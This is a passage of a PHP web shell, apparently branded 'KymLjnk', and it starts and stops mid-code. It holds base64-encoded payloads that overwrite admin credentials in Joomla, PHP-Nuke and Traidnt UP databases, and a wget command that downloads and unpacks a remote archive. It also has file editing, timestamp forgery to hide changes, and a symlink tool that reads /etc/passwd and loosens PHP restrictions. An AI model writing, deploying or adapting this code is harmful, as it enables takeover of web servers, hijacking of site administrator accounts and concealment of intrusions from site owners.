SdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWpvc18gdHlwZT10ZXh0IG5hbWU9cHJqb3Mgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nQ2hhbmdlJyA+PC9mb3JtPjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7Cn1lbHNlewokZGJoam9zID0gJF9QT1NUWydkYmhqb3MnXTsKJGRibmpvcyAgPSAkX1BPU1RbJ2RibmpvcyddOwokZGJ1am9zID0gJF9QT1NUWydkYnVqb3MnXTsKJGRicGpvcyAgPSAkX1BPU1RbJ2RicGpvcyddOwogICAgICAgICBAbXlzcWxfY29ubmVjdCgkZGJoam9zLCRkYnVqb3MsJGRicGpvcyk7CiAgICAgICAgIEBteXNxbF9zZWxlY3RfZGIoJGRibmpvcyk7CgokdXJqb3M9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVyam9zKTsKJHNldF91cmpvcyA9ICRfUE9TVFsndXJqb3MnXTsKCiRwc2pvcz1zdHJfcmVwbGFjZSgiXCciLCInIiwkcHNqb3MpOwokcGFzc19qb3MgPSAkX1BPU1RbJ3Bzam9zJ107CiRzZXRfcHNqb3MgPSBtZDUoJHBhc3Nfam9zKTsKCiRqb3NfcHJlZml4ID0gJF9QT1NUWydwcmpvcyddOwoKJHRhYmxlX25hbWU1ID0gJGpvc19wcmVmaXguInVzZXJzIiA7CgokbGVjb25ndGhpZW4xMyA9ICJVUERBVEUgJHRhYmxlX25hbWU1IFNFVCB1c2VybmFtZSA9JyIuJHNldF91cmpvcy4iJyBXSEVSRSBpZCA9JzYyJyI7CiRsZWNvbmd0aGllbjE0ID0gIlVQREFURSAkdGFibGVfbmFtZTUgU0VUIHBhc3N3b3JkID0nIi4kc2V0X3Bzam9zLiInIFdIRVJFIGlkID0nNjInIjsKCiRvazc9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjEzKTsKJG9rNz1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTQpOwoKaWYoJG9rNyl7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ0pvb21sYSB1cGRhdGUgc3VjY2VzcyAuIFRoYW5rIEt5bUxqbmsgdmVyeSBtdWNoIDspJyk7PC9zY3JpcHQ+IjsKfQp9CgovL1BIUC1OVUtFCmlmIChpc3NldCgkX1BPU1RbJ3BocC1udWtlJ10pKQp7CmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdpZHRoPScxMDAlJz4KPHRyPjx0ZD4KPGNlbnRlcj48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBQSFAtTlVLRSBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2FkbWluLnBocDxicj5QYXRoIENvbmZpZyA6IFtwYXRjaF0vY29uZmlnLnBocDwvZm9udD48L2NlbnRlcj4KICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHZhbHVlPWxvY2FsaG9zdCB0eXBlPXRleHQgbmFtZT1kYmhwbmsgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXBocG51a2UgdHlwZT10ZXh0IG5hbWU9ZGJucG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHVzZXI8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1yb290IHR5cGU9dGV4dCBuYW1lPWRidXBuayBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnBwbmsgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHVzZXIgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9dGV4dCBuYW1lPXVycG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBwYXNzd29yZCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT1wYXNzd29yZCBuYW1lPXBzcG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPW51a2VfIHR5cGU9dGV4dCBuYW1lPXBycG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHBuayA9ICRfUE9TVFsnZGJocG5rJ107CiRkYm5wbmsgID0gJF9QT1NUWydkYm5wbmsnXTsKJGRidXBuayA9ICRfUE9TVFsnZGJ1cG5rJ107CiRkYnBwbmsgID0gJF9QT1NUWydkYnBwbmsnXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaHBuaywkZGJ1cG5rLCRkYnBwbmspOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5wbmspOwoKJHVycG5rPXN0cl9yZXBsYWNlKCJcJyIsIiciLCR1cnBuayk7CiRzZXRfdXJwbmsgPSAkX1BPU1RbJ3VycG5rJ107CgokcHNwbms9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHBzcG5rKTsKJHBhc3NfcG5rID0gJF9QT1NUWydwc3BuayddOwokc2V0X3BzcG5rID0gbWQ1KCRwYXNzX3Buayk7CgokcG5rX3ByZWZpeCA9ICRfUE9TVFsncHJwbmsnXTsKCiR0YWJsZV9uYW1lNiA9ICRwbmtfcHJlZml4LiJ1c2VycyIgOwokdGFibGVfbmFtZTcgPSAkcG5rX3ByZWZpeC4iYXV0aG9ycyIgOwoKJGxlY29uZ3RoaWVuMTUgPSAiVVBEQVRFICR0YWJsZV9uYW1lNiBTRVQgdXNlcm5hbWUgPSciLiRzZXRfdXJwbmsuIicgV0hFUkUgdXNlcl9pZCA9JzInIjsKJGxlY29uZ3RoaWVuMTYgPSAiVVBEQVRFICR0YWJsZV9uYW1lNiBTRVQgdXNlcl9wYXNzd29yZCA9JyIuJHNldF9wc3Buay4iJyBXSEVSRSB1c2VyX2lkID0nMiciOwoKJGxlY29uZ3RoaWVuMTcgPSAiVVBEQVRFICR0YWJsZV9uYW1lNyBTRVQgYWlkID0nIi4kc2V0X3VycG5rLiInIFdIRVJFIHJhZG1pbnN1cGVyID0nMSciOwokbGVjb25ndGhpZW4xOCA9ICJVUERBVEUgJHRhYmxlX25hbWU3IFNFVCBwd2QgPSciLiRzZXRfcHNwbmsuIicgV0hFUkUgcmFkbWluc3VwZXIgPScxJyI7Cgokb2s4PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xNSk7CiRvazg9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjE2KTsKJG9rOD1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTcpOwokb2s4PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xOCk7CgppZigkb2s4KXsKZWNobyAiPHNjcmlwdD5hbGVydCgnUEhQLU5VS0UgdXBkYXRlIHN1Y2Nlc3MgLiBUaGFuayBLeW1Mam5rIHZlcnkgbXVjaCA7KScpOzwvc2NyaXB0PiI7Cn0KfQoKLy9UcmFpZG50IFVQCmlmIChpc3NldCgkX1BPU1RbJ3VwJ10pKQp7CmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdpZHRoPScxMDAlJz4KPHRyPjx0ZD4KPGNlbnRlcj48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBUcmFpZG50IFVQIEluZm88YnI+UGF0Y2ggQ29udHJvbCBQYW5lbCA6IFtwYXRjaF0vdXBsb2FkY3A8YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL2luY2x1ZGVzL2NvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJodXAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXVwbG9hZCB0eXBlPXRleHQgbmFtZT1kYm51cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiB1c2VyPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cm9vdCB0eXBlPXRleHQgbmFtZT1kYnV1cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnB1cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJ1cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGFzc3dvcmQgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9cGFzc3dvcmQgbmFtZT1wc3VwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHVwID0gJF9QT1NUWydkYmh1cCddOwokZGJudXAgID0gJF9QT1NUWydkYm51cCddOwokZGJ1dXAgPSAkX1BPU1RbJ2RidXVwJ107CiRkYnB1cCAgPSAkX1BPU1RbJ2RicHVwJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh1cCwkZGJ1dXAsJGRicHVwKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJudXApOwoKJHVydXA9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVydXApOwokc2V0X3VydXAgPSAkX1BPU1RbJ3VydXAnXTsKCiRwc3VwPXN0cl9yZXBsYWNlKCJcJyIsIiciLCRwc3VwKTsKJHBhc3NfdXAgPSAkX1BPU1RbJ3BzdXAnXTsKJHNldF9wc3VwID0gbWQ1KCRwYXNzX3VwKTsKCiRsZWNvbmd0aGllbjE5ID0gIlVQREFURSBhZG1pbiBTRVQgYWRtaW5fdXNlciA9JyIuJHNldF91cnVwLiInIFdIRVJFIGFkbWluX2lkID0nMSciOwokbGVjb25ndGhpZW4yMCA9ICJVUERBVEUgYWRtaW4gU0VUIGFkbWluX3Bhc3N3b3JkID0nIi4kc2V0X3BzdXAuIicgV0hFUkUgYWRtaW5faWQgPScxJyI7Cgokb2s5PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xOSk7CiRvazk9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjIwKTsKCmlmKCRvazkpewplY2hvICI8c2NyaXB0PmFsZXJ0KCdUcmFpZG50IFVQIHVwZGF0ZSBzdWNjZXNzIC4gVGhhbmsgS3ltTGpuayB2ZXJ5IG11Y2ggOyknKTs8L3NjcmlwdD4iOwp9Cn0KLy9FTkQKPz4K
    ';
        $file       = fopen("change-pas.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=change-pas.php width=100% height=720px frameborder=0></iframe> ";
    } elseif ($action == 'reverseip') {
        @exec('wget http://dl.dropbox.com/u/74425391/ip.tar.gz');
        @exec('tar -xvf ip.tar.gz');
        echo "<iframe src=ip/index.php width=100% height=720px frameborder=0></iframe> ";
    } elseif ($action == 'editfile') {
        if (file_exists($opfile)) {
            $fp       = @fopen($opfile, 'r');
            $contents = @fread($fp, filesize($opfile));
            @fclose($fp);
            $contents = htmlspecialchars($contents);
        }
        formhead(array(
            'title' => 'Create / Edit File'
        ));
        makehide('action', 'file');
        makehide('dir', $nowpath);
        makeinput(array(
            'title' => 'Current File (import new file name and new file)',
            'name' => 'editfilename',
            'value' => $opfile,
            'newline' => 1
        ));
        maketext(array(
            'title' => 'File Content',
            'name' => 'filecontent',
            'value' => $contents
        ));
        formfooter();
    } elseif ($action == 'newtime') {
        $opfilemtime = @filemtime($opfile);
        $cachemonth  = array(
            'January' => 1,
            'February' => 2,
            'March' => 3,
            'April' => 4,
            'May' => 5,
            'June' => 6,
            'July' => 7,
            'August' => 8,
            'September' => 9,
            'October' => 10,
            'November' => 11,
            'December' => 12
        );
        formhead(array(
            'title' => 'Clone file was last modified time'
        ));
        makehide('action', 'file');
        makehide('dir', $nowpath);
        makeinput(array(
            'title' => 'Alter file',
            'name' => 'curfile',
            'value' => $opfile,
            'size' => 120,
            'newline' => 1
        ));
        makeinput(array(
            'title' => 'Reference file (fullpath)',
            'name' => 'tarfile',
            'size' => 120,
            'newline' => 1
        ));
        formfooter();
        formhead(array(
            'title' => 'Set last modified'
        ));
        makehide('action', 'file');
        makehide('dir', $nowpath);
        makeinput(array(
            'title' => 'Current file (fullpath)',
            'name' => 'curfile',
            'value' => $opfile,
            'size' => 120,
            'newline' => 1
        ));
        p('<p>Instead &raquo;');
        p('year:');
        makeinput(array(
            'name' => 'year',
            'value' => date('Y', $opfilemtime),
            'size' => 4
        ));
        p('month:');
        makeinput(array(
            'name' => 'month',
            'value' => date('m', $opfilemtime),
            'size' => 2
        ));
        p('day:');
        makeinput(array(
            'name' => 'day',
            'value' => date('d', $opfilemtime),
            'size' => 2
        ));
        p('hour:');
        makeinput(array(
            'name' => 'hour',
            'value' => date('H', $opfilemtime),
            'size' => 2
        ));
        p('minute:');
        makeinput(array(
            'name' => 'minute',
            'value' => date('i', $opfilemtime),
            'size' => 2
        ));
        p('second:');
        makeinput(array(
            'name' => 'second',
            'value' => date('s', $opfilemtime),
            'size' => 2
        ));
        p('</p>');
        formfooter();
    } elseif ($action == 'symroot') {
        $file       = fopen($dir . "symroot.php", "w+");
        $perltoolss = 'PD9waHAKCgogJGhlYWQgPSAnCjxodG1sPgo8aGVhZD4KPC9zY3JpcHQ+Cjx0aXRsZT4tLT09W1tTeW0gbGpuayBBTGwgQ29uRmlnICsgU3ltIFJvb3QgYnkgS3ltIExqbmtdXT09LS08L3RpdGxlPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+Cgo8U1RZTEU+CmJvZHkgewpmb250LWZhbWlseTogVGFob21hCn0KdHIgewpCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsKY29sb3I6ICNGRkY7Cn0KdGQgewpCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsKY29sb3I6ICNGRkY7Cn0KLnRhYmxlMSB7CkJPUkRFUjogMHB4IEJsYWNrOwpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsKY29sb3I6ICNGRkY7Cn0KLnRkMSB7CkJPUkRFUjogMHB4OwpCT1JERVItQ09MT1I6ICMzMzMzMzM7CmZvbnQ6IDdwdCBWZXJkYW5hOwpjb2xvcjogR3JlZW47Cn0KLnRyMSB7CkJPUkRFUjogMHB4OwpCT1JERVItQ09MT1I6ICMzMzMzMzM7CmNvbG9yOiAjRkZGOwp9CnRhYmxlIHsKQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7CkJPUkRFUi1DT0xPUjogIzMzMzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmNvbG9yOiAjRkZGOwp9CmlucHV0IHsKYm9yZGVyCQkJOiBkYXNoZWQgMXB4Owpib3JkZXItY29sb3IJCTogIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDhwdCBWZXJkYW5hOwpjb2xvcjogUmVkOwp9CnNlbGVjdCB7CkJPUkRFUi1SSUdIVDogIEJsYWNrIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgI0RGMDAwMCAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICNERjAwMDAgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiBCbGFjayAxcHggc29saWQ7CkJPUkRFUi1jb2xvcjogI0ZGRjsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDhwdCBWZXJkYW5hOwpjb2xvcjogUmVkOwp9CnN1Ym1pdCB7CkJPUkRFUjogIGJ1dHRvbmhpZ2hsaWdodCAycHggb3V0c2V0OwpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsKd2lkdGg6IDMwJTsKY29sb3I6ICNGRkY7Cn0KdGV4dGFyZWEgewpib3JkZXIJCQk6IGRhc2hlZCAxcHggIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IEZpeGVkc3lzIGJvbGQ7CmNvbG9yOiAjOTk5Owp9CkJPRFkgewoJU0NST0xMQkFSLUZBQ0UtQ09MT1I6IEJsYWNrOyBTQ1JPTExCQVItSElHSExJR0hULWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItU0hBRE9XLWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItM0RMSUdIVC1jb2xvcjogI0ZGRjsgU0NST0xMQkFSLUFSUk9XLUNPTE9SOiBCbGFjazsgU0NST0xMQkFSLVRSQUNLLWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItREFSS1NIQURPVy1jb2xvcjogI0ZGRgptYXJnaW46IDFweDsKY29sb3I6IFJlZDsKYmFja2dyb3VuZC1jb2xvcjogQmxhY2s7Cn0KLm1haW4gewptYXJnaW4JCQk6IC0yODdweCAwcHggMHB4IC00OTBweDsKQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7CkJPUkRFUi1DT0xPUjogIzMzMzMzMzsKfQoudHQgewpiYWNrZ3JvdW5kLWNvbG9yOiBCbGFjazsKfQoKQTpsaW5rIHsKCUNPTE9SOiBXaGl0ZTsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTp2aXNpdGVkIHsKCUNPTE9SOiBXaGl0ZTsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTpob3ZlciB7Cgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmFjdGl2ZSB7Cgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUKfQo8L1NUWUxFPgo8c2NyaXB0IGxhbmd1YWdlPVwnamF2YXNjcmlwdFwnPgpmdW5jdGlvbiBoaWRlX2RpdihpZCkKewogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKS5zdHlsZS5kaXNwbGF5ID0gXCdub25lXCc7CiAgZG9jdW1lbnQuY29va2llPWlkK1wnPTA7XCc7Cn0KZnVuY3Rpb24gc2hvd19kaXYoaWQpCnsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCkuc3R5bGUuZGlzcGxheSA9IFwnYmxvY2tcJzsKICBkb2N1bWVudC5jb29raWU9aWQrXCc9MTtcJzsKfQpmdW5jdGlvbiBjaGFuZ2VfZGl2c3QoaWQpCnsKICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpLnN0eWxlLmRpc3BsYXkgPT0gXCdub25lXCcpCiAgICBzaG93X2RpdihpZCk7CiAgZWxzZQogICAgaGlkZV9kaXYoaWQpOwp9Cjwvc2NyaXB0Pic7ID8+CjxodG1sPgoJPGhlYWQ+CgkJPD9waHAgCgkJZWNobyAkaGVhZCA7CgkJZWNobyAnCgo8dGFibGUgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCIgY2xhc3M9InRiMSIgPgoKCQkJCgogICAgICAgPHRkIHdpZHRoPSIxMDAlIiBhbGlnbj1jZW50ZXIgdmFsaWduPSJ0b3AiIHJvd3NwYW49IjEiPgogICAgICAgICAgIDxmb250IGNvbG9yPXJlZCBzaXplPTUgZmFjZT0iY29taWMgc2FucyBtcyI+PGI+LS09PVtbIFN5bSBsam5rIEFMbCBDb25GaWc8L2ZvbnQ+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT01IGZhY2U9ImNvbWljIHNhbnMgbXMiPjxiPiAgICsgU3ltIFJvb3QgPC9mb250Pjxmb250IGNvbG9yPWdyZWVuIHNpemU9NSBmYWNlPSJjb21pYyBzYW5zIG1zIj48Yj4gVGVhbSBieSBLeW0gTGpuayBdXT09LS08L2ZvbnQ+IDxkaXYgY2xhc3M9ImhlZHIiPiAKCiAgICAgICAgPHRkIGhlaWdodD0iMTAiIGFsaWduPSJsZWZ0IiBjbGFzcz0idGQxIj48L3RkPjwvdHI+PHRyPjx0ZCAKICAgICAgICB3aWR0aD0iMTAwJSIgYWxpZ249ImNlbnRlciIgdmFsaWduPSJ0b3AiIHJvd3NwYW49IjEiPjxmb250IAogICAgICAgIGNvbG9yPSJyZWQiIGZhY2U9ImNvbWljIHNhbnMgbXMic2l6ZT0iMSI+PGI+IAogICAgICAgIAkJCQkJCiAgICAgICAgICAgPC90YWJsZT4KICAgICAgICAKCic7IAoKPz4KPGNlbnRlcj4KPGZvcm0gbWV0aG9kPXBvc3Q+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9ImNvbWljIHNhbnMgbXMiPjEuIENyZWF0IHBocC5pbmkgZmlsZTwvZm9udD48cD4KPGlucHV0IHR5cGU9c3VibWl0IG5hbWU9aW5pIHZhbHVlPSJ1c2UgdG8gR2VuZXJhdGUgUEhQLmluaSIgLz48L2Zvcm0+Cjxmb3JtIG1ldGhvZD1wb3N0Pjxmb250IGNvbG9yPXdoaXRlIHNpemU9MiBmYWNlPSJjb21pYyBzYW5zIG1zIj4yLiBHZXQgdXNlcm5hbWVzIGZvciBzeW1saW5rPC9mb250PjxwPgoJPGlucHV0IHR5cGU9c3VibWl0IG5hbWU9InVzcmUiIHZhbHVlPSJ1c2UgdG8gRXh0cmFjdCB1c2VybmFtZXMiIC8+PC9mb3JtPgoJCgk8P3BocAoJaWYoaXNzZXQoJF9QT1NUWydpbmknXSkpCgl7CgkJCgkJJHI9Zm9wZW4oJ3BocC5pbmknLCd3Jyk7CgkJJHJyPSIgZGlzYmFsZV9mdW5jdGlvbnM9bm9uZSAiOwoJCWZ3cml0ZSgkciwkcnIpOwoJCSRsaW5rPSI8YSBocmVmPXBocC5pbmk+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+PHU+b3BlbiBQSFAuSU5JPC91PjwvZm9udD48L2E+IjsKCQllY2hvICRsaW5rOwkKCQl9Cgk/PgoJPD9waHAKCWlmKGlzc2V0KCRfUE9TVFsndXNyZSddKSl7CgkJPz48Zm9ybSBtZXRob2Q9cG9zdD4KCTx0ZXh0YXJlYSByb3dzPTEwIGNvbHM9NTAgbmFtZT11c2VyPjw/cGhwICAkdXNlcnM9ZmlsZSgiL2V0Yy9wYXNzd2QiKTsKZm9yZWFjaCgkdXNlcnMgYXMgJHVzZXIpCnsKJHN0cj1leHBsb2RlKCI6IiwkdXNlcik7CmVjaG8gJHN0clswXS4iXG4iOwp9Cgo/PjwvdGV4dGFyZWE+PGJyPjxicj4KCTxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXN1IHZhbHVlPSJMZXRzIFN0YXJ0IiAvPjwvZm9ybT4KCTw/cGhwIH0gPz4KCTw/cGhwCgllcnJvcl9yZXBvcnRpbmcoMCk7CgllY2hvICI8Zm9udCBjb2xvcj1yZWQgc2l6ZT0yIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+IjsKCWlmKGlzc2V0KCRfUE9TVFsnc3UnXSkpCgl7Cglta2Rpcignc3ltJywwNzc3KTsKJHJyICA9ICIgT3B0aW9ucyBhbGwgXG4gRGlyZWN0b3J5SW5kZXggU3V4Lmh0bWwgXG4gQWRkVHlwZSB0ZXh0